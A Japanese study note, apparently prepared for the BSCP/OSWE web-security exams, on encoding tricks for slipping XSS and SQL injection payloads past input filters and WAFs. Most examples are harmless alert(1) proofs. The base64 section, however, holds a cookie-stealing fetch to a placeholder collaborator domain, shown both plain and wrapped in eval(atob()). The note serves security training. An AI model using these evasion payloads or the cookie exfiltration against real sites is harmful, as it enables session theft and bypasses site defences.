- 詳細：🔗[Obfuscating attacks using encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
- ペイロードのデコードで攻撃を防御するWebサイトに対して、難読化でXSSやSQLiを成功させるテクニック

>[!NOTE]
>OSCP試験においてはここまで求められない。BSCP、OSWE範囲。

---

# 考え方

## 特定のcontextに合わせたデコードを把握する

- ペイロードがどこに注入されるかを正確に考え、どのようなエンコード・デコードがされるかを推測すること
	- クエリパラメタならクライアントでエンコードされ、サーバでURLデコードされる
	- HTML要素はサーバでエンコードされ、クライアントでHTMLデコードされる

## デコードの不一致を利用する

- ペイロードに対して、URLエンコードとHTMLエンコードなど、異なるエンコードを複数かけること：[多段階encoding](Web攻撃の難読化.md#多段階encoding)
- もしくは二重URLエンコード： [URL encoding](Web攻撃の難読化.md#URL%20encoding)
- マイナーなエンコード

### なぜ成功するのか

- Webサイトの入力フィルタが入力を検証する際に使用するデコードと、バックエンド・ブラウザがデータを使用する際に実行されるデコードが一致していない
- このとき、フィルタのデコードで安全だと判断されたデータが、使用される時に実行されるデコードで悪意あるペイロードに変換される可能性がある

---

# URL encoding

- クエリパラメタやbody部等にペイロードを注入する場合
- ペイロードをURLエンコードしてWAFを通過できるかも
	- SELECTがブラックリスト入りしている場合、`SELECT` -> `%53%45%4C%45%43%54` (HackVertor: urlencode_all)

- もしくは二重URLエンコード

>[!Warning]
>ペイロードとターゲット環境次第だが、すべての文字列をURLエンコードするとペイロードがうまく動作しなくなることがある。

---

# HTML encoding

- クライアントサイドのペイロードに役立つ
- HTML要素のテキストコンテンツ、属性(`href`,`onerror`等)にペイロードを注入する場合
	- ブラウザにレンダリングするときデコードされる

- `:`と同じ意味のもの↓
	- `&colon;`(HackVertor: html5_entities)
	- `&#58;` (HackVertor: html_entities)
	- `&#00000000000058;` もOK 。先頭ゼロ埋め
	- `&#x3a;` (HackVertor: hex_entities)

- alert がblacklist入りしている場合、
```html
<img src=x onerror="&#x61;lert(1)">
```

---

# XML encoding

- サーバサイドのペイロードに役立つ
- HTML encodingと同じ形式。違いはサーバ側でデコードされること。

---

# unicode escaping

- JSの文字列(XSSペイロードの中等)としてペイロードを埋め込む場合
- `:`と同じ意味のもの↓
	- `\u003A` (HackVertor: unicode_escapes)
	- `\u{3a}`
	- `\u{0000003a} `もOK。{}内先頭0埋め

- alert がblacklist入りしている場合、
```js
eval("\\u0061lert(1)")
```
- `:`がblacklist入りしている場合、
```html
<a href="javascript\\u{0000000003a}alert(1)">Click me</a>
```

>[!NOTE]
>エクスプロイトサーバからDeliverするとデコードされて渡されるので、フィルタ回避できない。

---

# hex escaping

- JSの文字列としてペイロードを埋め込む場合（HackVertor: hex_escapes）
```js
// alert
eval("\x61lert")
```

- SQL文字列のペイロードを埋め込む場合(HackVertor: sql_hex)
	- `SELECT` -> `0x53454c454354`

---

# octal escaping

- JSの文字列としてペイロードを埋め込む場合(HackVertor: octal_escapes)
	- (octal = 8進数)

---

#  SQL: CHAR()関数

- SQLペイロードの場合

- ↓SELECT
```sql
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
```

1. HackVertor: to_charcodeで変換
2. `CHAR()+`の形式で、出力値を()に代入

---

# base64 encoding

- URL等がブロックされる時などに便利。Practice examにも登場したテクニック
- 通信に問題が発生する可能性のあるデータ(Cookie等に`&`などURL上特殊文字が含まれているかもしれないもの)を送るときにbase64は使う

- 例えばCookieを抽出するXSSペイロードを埋め込みたいが、特定のキャラクタ(`.`)等がフィルタされている場合
```
fetch('https://COLLABORATOR_DOMAIN?c='+document.cookie)
```
	↓Base64 encode
```
ZmV0Y2goJ2h0dHBzOi8vQ09MTEFCT1JBVE9SX0RPTUFJTj9jPScrZG9jdW1lbnQuY29va2llKQ==
```
	↓
```js
eval('atob("ZmV0Y2goJ2h0dHBzOi8vQ09MTEFCT1JBVE9SX0RPTUFJTj9jPScrZG9jdW1lbnQuY29va2llKQ==")')
```
- `atob`: base64デコードする(`btoa`はその逆)

---

#  多段階encoding

- デコードの順序を理解する必要がある
- `&bsol;u0061`[HTML encoding](Web攻撃の難読化.md#HTML%20encoding) -> `\u0061`[unicode escaping](Web攻撃の難読化.md#unicode%20escaping) → `a`
```html
<a href="javascript:&bsol;u0061lert(1)">Click me</a>
```

---

# 大文字小文字組合せ

- admin -> AdMiN

---

# Misc

## JavaScript記法の変換

- ドット記法(`document.cookie`) ⇔ ブラケット記法(`document['cookie']`)